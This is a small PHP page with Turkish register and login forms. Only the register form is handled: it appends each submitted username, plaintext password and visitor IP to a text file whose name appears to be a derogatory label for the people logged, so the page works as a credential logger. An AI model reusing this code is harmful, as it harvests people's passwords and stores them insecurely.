<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title>Document</title>
</head>
<body>
	<h2>Kayıt Ol</h2>	<br>
	<form method="POST">
		Kullanıcı Adı: <input type="text" name="gName">
		<br>
		Şifre: <input type="text" name="gPass">
		<br>
		<input type="submit">
	</form>
	<h2>Giriş Yap</h2> <br>
	<form method="POST">
		Kullanıcı Adı: <input type="text" name="rName">
		<br>
		Şifre: <input type="text" name="rPass">
		<br>
		<input type="submit">
	</form>
	<?php
		if(isset($_POST["gName"]) and isset($_POST["gPass"])){
			$gName = $_POST["gName"];
			$gPass = $_POST["gPass"];
			$ip = $_SERVER['REMOTE_ADDR'];
			$gNametxt = fopen("hdpkerizler.txt","a");
			
			fwrite($gNametxt, "\n" . "UserName :  "  . $gName . "\n" . "Password :  " . $gPass . "\n" . "Ip Adresi :  " . $ip . "\n" . "-----------------------------------------------------------------------------");
			fclose($gNametxt);
			
		}
		
	?>
</body>
</html>